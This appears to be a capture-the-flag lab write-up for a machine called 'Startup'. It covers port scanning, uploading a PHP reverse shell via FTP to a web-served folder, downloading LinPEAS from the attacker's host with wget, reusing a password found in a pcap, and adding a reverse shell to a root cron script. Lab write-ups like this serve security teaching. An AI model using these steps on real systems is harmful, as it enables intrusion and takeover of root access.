# Enumeration
Let's start with rustscan to quickly enumerate the open ports. We find ports 21, 22, and 80 are open.

![0b0a1393535cfb77e1684e24ed675b7b.png](./_resources/0b0a1393535cfb77e1684e24ed675b7b.png)

Let's confirm with a full nmap scan, followed by a detailed scan of the ports we found.

![14d87a19014746d192835e0eeb959193.png](./_resources/14d87a19014746d192835e0eeb959193.png)

![c7fdb42b47ebd45c60d3fa56dcbb6b6c.png](./_resources/c7fdb42b47ebd45c60d3fa56dcbb6b6c.png)

We'll begin our enumeration by investigating the ftp server. Our nmap scan already told us to expect a few files here.

![a5cdf5a9dbf42457911e23a2499f6a64.png](./_resources/a5cdf5a9dbf42457911e23a2499f6a64.png)

The two files don't lead us anywhere, but notice the `ftp` directory. If we use gobuster to enumerate the directories of the webpage, we eventually find a `files` directory which contains the files and folder we found on the ftp server.

```bash
gobuster dir -u http://10.10.62.179 -w /usr/share/dirb/wordlists/common.txt -x .txt,.html
```

![6ba35217cfd9404556cc15ce47038fe5.png](./_resources/6ba35217cfd9404556cc15ce47038fe5.png)

![f6e95a71e92c02d0eb5f408768a39593.png](./_resources/f6e95a71e92c02d0eb5f408768a39593.png)

This gives us a connection between the http and ftp servers.
<br>

# Exploitation
Let's create a [reverse shell php script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). We can upload it the `/files/ftp` directory via ftp the server. 

![72d0187d945ed179cb895bbc105850d5.png](./_resources/72d0187d945ed179cb895bbc105850d5.png)

Set up a netcat listener on the chosen port. Now click on the php file on the web server to catch the reverse shell. From here we easily find the `recipe.txt` file needed for one of the Task's questions.

![2fb786ad9fd4022149988ef94fadbc9f.png](./_resources/2fb786ad9fd4022149988ef94fadbc9f.png)

![722da659380cc5ccaba12d2172d4f757.png](./_resources/722da659380cc5ccaba12d2172d4f757.png)

We can upgrade our shell with `python -c 'import pty; pty.spawn("/bin/bash")'`.

Let's use [LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/tag/20220717) to search for possible privilege escalation methods on the target machine. Download the linpeas.sh file onto the attacking machine, spin up a webserver with `python3 -m http.server`, and download it onto the target machine using `wget <attacking IP>:8000/linpeas.sh`.

![9299f7445bd2df16067f66c6d071f90e.png](./_resources/9299f7445bd2df16067f66c6d071f90e.png)

Here I saved the file to the `/tmp` directory since we know we can write there. Now use `chmod +x linpeas.sh` to mark the file as executable, then run it with `./linpeas.sh`.  LinPEAS finds some unexpected files in the root folder.

![a9f8fb82cf66220ed2036148bef82031.png](./_resources/a9f8fb82cf66220ed2036148bef82031.png)

Let's investigate. The only file/folder which leads us anywhere is the `/incidents` directory, since it contains a pcap file which we will want to take a look at with Wireshark.

![dde5ba4c77af8690d15e41f6894cbec5.png](./_resources/dde5ba4c77af8690d15e41f6894cbec5.png)

To transfer the pcap file to our local machine, we can put it on the ftp server and then download it from the http server at the `/files/ftp` directory.

![a06f4fbcc0fddd885252ce9826e9ae2a.png](./_resources/a06f4fbcc0fddd885252ce9826e9ae2a.png)

Let's open Wireshark and examine the pcap file. We're interested in http traffic, so right-click on any http packet and follow the http stream. Doing so reveals what appears to be an unauthorized attempt at accessing some files on the system. The relevant part for us is the following:

![2ef4ed1d1c8ed56cde5de4e35d46bf32.png](./_resources/2ef4ed1d1c8ed56cde5de4e35d46bf32.png)

So it looks like the attacker tried to determine the www-data user's sudo privileges, but didn't have the correct password. However, this gives us a possible password to work with. We try with the username lennie, since the attacker seemed to be trying to `cd` into lennie's home directory.

![647b3c00f3249cae565e5130ffbb8b08.png](./_resources/647b3c00f3249cae565e5130ffbb8b08.png)

Success! From here we can get the `user.txt` flag within lennie's home directory.

![86097ac83002c6bc9cbc2575a3fa60f0.png](./_resources/86097ac83002c6bc9cbc2575a3fa60f0.png)
<br>

# Post-Exploitation

Let's begin looking for privesc methods. First note that lennie's home directory contains a `scripts` folder. Examining the contents, we see that there is a `planner.sh` script; note that we cannot write to this script.

```bash
lennie@startup:~$ ls
Documents  scripts  user.txt
lennie@startup:~$ cd scripts
lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 7 lennie lennie 4096 Jul 29 05:35 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Jul 29 05:37 startup_list.txt
lennie@startup:~/scripts$ cat startup_list.txt 

lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

The script copies some text onto the (currently empty) `startup_list.txt` file, and then it runs another script called `print.sh`. Using `grep -rnw / -e "planner.sh" 2>/dev/null`, we can verify that the `planner.sh` script is run by cron.

```txt
lennie@startup:/etc$ grep -rnw / -e "planner.sh" 2>/dev/null
/proc/sched_debug:434:      planner.sh  4523      2486.432522         2   120         0.163993         0.987655         0.000000 0 0 /system.slice/cron.service
```

Let's now examine the `print.sh` script. Note that lennie is the owner, and so we can modify this script.

![6d451bb3716d766f31624a184c7e62b6.png](./_resources/6d451bb3716d766f31624a184c7e62b6.png)

```bash
lennie@startup:/etc$ cat print.sh
#!/bin/bash
echo "Done!"
```

We will add a line which will execute a reverse bash shell. I copied the command from [this](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) excellent list of one-liner reverse shell scripts. Our new `print.sh` file now looks like:

![07352a227f2195eebc73b79352008438.png](./_resources/07352a227f2195eebc73b79352008438.png)

Now set up a netcat listener on the chosen port. After a short while, we catch the reverse shell with root privileges. We can then read the `root.txt` flag.

![b7634263c5fce52854173097dda5e94d.png](./_resources/b7634263c5fce52854173097dda5e94d.png)